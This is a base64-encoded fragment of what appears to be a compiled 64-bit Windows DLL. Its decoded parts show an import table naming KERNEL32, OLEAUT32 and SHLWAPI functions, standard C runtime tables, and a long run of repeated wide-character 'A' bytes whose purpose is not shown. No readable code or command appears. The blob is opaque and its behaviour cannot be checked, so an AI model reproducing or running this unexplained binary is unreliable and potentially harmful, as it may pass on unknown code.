RNb2R1bGVIYW5kbGVXAABLRVJORUwzMi5kbGwAAE9MRUFVVDMyLmRsbAAATgFTdHJTdHJJQQAAU0hMV0FQSS5kbGwAVgJHZXRMYXN0RXJyb3IAANQDTXVsdGlCeXRlVG9XaWRlQ2hhcgDdBVdpZGVDaGFyVG9NdWx0aUJ5dGUAtQNMb2NhbEZyZWUArgRSdGxDYXB0dXJlQ29udGV4dAC1BFJ0bExvb2t1cEZ1bmN0aW9uRW50cnkAALwEUnRsVmlydHVhbFVud2luZAAAkgVVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAFIFU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAA8CR2V0Q3VycmVudFByb2Nlc3MAcAVUZXJtaW5hdGVQcm9jZXNzAABwA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAMARRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgAQAkdldEN1cnJlbnRQcm9jZXNzSWQAFAJHZXRDdXJyZW50VGhyZWFkSWQAAN0CR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUAVANJbml0aWFsaXplU0xpc3RIZWFkAGoDSXNEZWJ1Z2dlclByZXNlbnQAxQJHZXRTdGFydHVwSW5mb1cAtwRSdGxQY1RvRmlsZUhlYWRlcgAlAUVuY29kZVBvaW50ZXIARARSYWlzZUV4Y2VwdGlvbgAAuwRSdGxVbndpbmRFeABYA0ludGVybG9ja2VkRmx1c2hTTGlzdAAZBVNldExhc3RFcnJvcgAAKQFFbnRlckNyaXRpY2FsU2VjdGlvbgAApQNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAABgFEZWxldGVDcml0aWNhbFNlY3Rpb24AUQNJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQW5kU3BpbkNvdW50AIIFVGxzQWxsb2MAAIQFVGxzR2V0VmFsdWUAhQVUbHNTZXRWYWx1ZQCDBVRsc0ZyZWUApAFGcmVlTGlicmFyeQCqA0xvYWRMaWJyYXJ5RXhXAABXAUV4aXRQcm9jZXNzAGwCR2V0TW9kdWxlSGFuZGxlRXhXAAA8A0hlYXBGcmVlAAA4A0hlYXBBbGxvYwCZA0xDTWFwU3RyaW5nVwAAbgFGaW5kQ2xvc2UAcwFGaW5kRmlyc3RGaWxlRXhBAACDAU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AAAAAAAAAAAiAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+////AAAAANiIAYABAAAAhNYBgAEAAACE1gGAAQAAAITWAYABAAAAhNYBgAEAAACE1gGAAQAAAITWAYABAAAAhNYBgAEAAACE1gGAAQAAAITWAYABAAAAf39/f39/f3/ciAGAAQAAAIjWAYABAAAAiNYBgAEAAACI1gGAAQAAAIjWAYABAAAAiNYBgAEAAACI1gGAAQAAAIjWAYABAAAALgAAAC4AAAD+/////////wAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQ